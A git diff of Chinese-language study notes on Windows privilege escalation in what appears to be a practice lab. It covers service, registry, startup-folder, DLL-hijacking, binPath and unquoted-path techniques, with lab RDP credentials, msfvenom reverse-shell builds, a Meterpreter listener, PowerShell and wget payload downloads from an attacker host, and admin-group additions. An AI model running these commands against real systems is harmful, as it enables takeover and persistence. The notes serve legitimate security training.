@@ -1,10 +1,10 @@
 
 # rdp连接
 user登录
-> rdesktop -u user -p password321 10.10.55.2 -r sound:on -g workarea
+> rdesktop -u user -p password321 10.10.68.121 -r sound:on -g workarea
 
 TCM登录
-> rdesktop -u TCM -p Hacker123 10.10.55.2 -r sound:on -g workarea
+> rdesktop -u TCM -p Hacker123 10.10.68.121 -r sound:on -g workarea
 
 # 1.注册表提权-自动运行（ Registry Escalation - Autorun）
 
@@ -87,7 +87,7 @@ Server username: NT AUTHORITY\SYSTEM
 
 ```
 
-# 服务提权-注册表（Service Escalation - Registry）
+# 3.服务提权-注册表（Service Escalation - Registry）
 
 ## 前提
 
@@ -191,6 +191,7 @@ void ControlHandler(DWORD request)
 > x86_64-w64-mingw32-gcc windows_service.c -o x.exe 
 
 3. 把x.exe文件传回靶机。放到```C:\Temp```下面
+> powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.13.21.169:8000/x.exe','C:\temp\x.exe')"
 
 4. 命令行输入：
 >  reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
@@ -200,3 +201,185 @@ void ControlHandler(DWORD request)
 
 现在查看admin用户组，就可以看到本账户已经被添加到administrators组：
 > net localgroup administrators
+
+# 4.服务提权-可执行文件（Service Escalation - Executable Files）
+
+## 前提
+1. 用```accesschk64.exe```检查某个服务的权限，这里选择```C:\Program Files\File Permissions Service```
+> C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
+
+2. 如果文件``` filepermservice.exe```对所有人都有```FILE_ALL_ACCESS```权限
+
+3. 有重启这个服务的权限
+
+## 思路
+
+我觉得跟上面那个注册服务的思路是一样的。1要对服务有写入权限，2可以重启这个服务。
+
+## 怎么利用?
+
+1. 把上面生成的那个反弹shell文件拷贝到目标服务
+>  copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
+
+2. 重启服务
+> sc start filepermsvc
+
+3. 查看管理员组，当前账号是否被添加进该组
+> net localgroup administrators
+
+# 5.权限提升-启动应用程序
+
+## 前提
+1. 对启动应用程序目录有写入权限。
+> icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+
+2. 如果```BUILTIN\Users```组对这个文件夹拥有``` full access ‘(F)’ ```
+
+3. 必须等待管理员登陆。
+
+## 思路
+
+```"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"```就是开机启动程序所在的文件夹，在这里写一个反弹shell，等待管理员登陆以后就可以收到管理员的shell。
+
+## 怎么利用?
+
+攻击端：
+1. 开启监听
+> msfconsole
+
+> use multi/handler
+
+> set payload windows/meterpreter/reverse_tcp
+
+> set lhost [Kali VM IP Address]
+
+> run
+
+2. 生成反弹shell
+> msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.13.21.169 LPORT=4444 -f exe -o reverse.exe
+
+靶机端：
+1. 下载反弹shell到开机启动程序目录
+> powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.13.21.169:8000/reverse.exe','C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\reverse.exe')"
+
+
+
+等待管理员登陆。
+
+# 6.服务提权-DLL劫持（Service Escalation - DLL Hijacking）
+
+## 前提
+1. 知道某个服务缺少DLL文件
+
+2. 这个DLL文件所在的目录是可写的
+
+3. 可以重启这个服务
+
+## 思路
+DLL就是windows下的动态连接库，它不可以被直接执行，仅供应用程序调用。有时候系统会缺少某些不太重要的DLL库，此时就可以制造一个恶意的DLL库劫持掉应用程序调用，执行恶意代码进行提权。
+
+## 如何利用
+
+模板DLL利用代码：
+```
+#include <windows.h>
+
+BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
+    if (dwReason == DLL_PROCESS_ATTACH) {
+        system("cmd.exe /k whoami > C:\\Temp\\dll.txt");
+        ExitProcess(0);
+    }
+    return TRUE;
+}
+```
+
+把system里面的命令换成想要执行的命令即可，例如可以把当前账号添加进管理员用户组：```cmd.exe /k net localgroup administrators user /add```
+
+编译成DLL文件：
+> x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
+
+
+# 7.服务升级-binPath（Service Escalation - binPath）
+
+## 前提
+1. ```accesschk64.exe```检查某个服务的权限时，当前账号拥有对这个服务的```SERVICE_CHANGE_CONFIG```权限,这里选择```daclsvc```服务
+> C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc
+
+2. 可以重启这个服务。
+
+## 思路
+binPath原本是指服务的二进制路径，但是它作为参数时也可以执行系统的命令。详细参考[hacktricks](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#modify-service-binary-path)
+
+## 如何利用
+1. 把当前账号加入到管理员用户组
+> sc config daclsvc binpath= "net localgroup administrators user /add"
+
+2. 重启服务
+> sc start daclsvc
+
+
+# 8.服务升级-未加引号的服务路径(Service Escalation - Unquoted Service Paths)
+
+## 前提
+
+1. ```sc qc 服务名称```，在```BINARY_PATH_NAME```一栏中，路径没有引号，这里选择```unquotedsvc```服务
+> sc qc unquotedsvc
+
+显示：
+```
+
+C:\Users\user>sc qc unquotedsvc
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: unquotedsvc
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files
+\unquotedpathservice.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Unquoted Path Service
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+
+C:\Users\user>sc qc cmd
+[SC] OpenService FAILED 1060:
+
+The specified service does not exist as an installed service.
+
+```
+
+2. 可以重启这个服务。
+
+3. 能够在利用路径写入文件。
+
+
+## 思路
+
+一个正常程序路径，比如：
+
+```C:\Program Files\topservice folder\subservice subfolder\srvc.exe```
+
+windows读取的应该是```C:\Program Files\topservice folder\subservice subfolder```的```srvc.exe```程序
+
+但是有一种情况是，假如这个路径没有加引号，那么windows对于这个路径的读取处理依次为：
+
+1. C:\Program.exe
+2. C:\Program Files\topservice.exe
+3. C:\Program Files\topservice folder\subservice.exe
+
+即读取最近那个路径的第一个单词的同名exe文件，知道了这一点，如果我们可以将一个可执行文件放在我们知道服务正在寻找的位置，它可能由服务运行。 
+
+## 如何利用
+
+1. 生成一个可以利用的二进制反弹shell
+
+> msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.21.169 LPORT=4444 -f exe > common.exe
+
+2. 在靶机里把该文件下载到可以使用的路径当中
+> wget -O common.exe 10.13.21.169:8000/common.exe
+
+
+3. 重启服务
+> sc start 服务名称
